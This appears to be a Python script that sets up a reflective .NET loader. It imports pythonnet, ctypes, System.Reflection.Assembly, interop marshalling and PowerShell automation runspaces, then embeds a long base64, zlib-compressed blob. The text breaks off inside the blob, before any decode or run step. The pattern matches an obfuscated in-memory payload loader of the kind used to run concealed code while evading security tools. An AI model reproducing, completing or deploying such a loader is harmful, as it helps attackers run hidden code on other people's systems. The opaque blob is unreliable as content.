import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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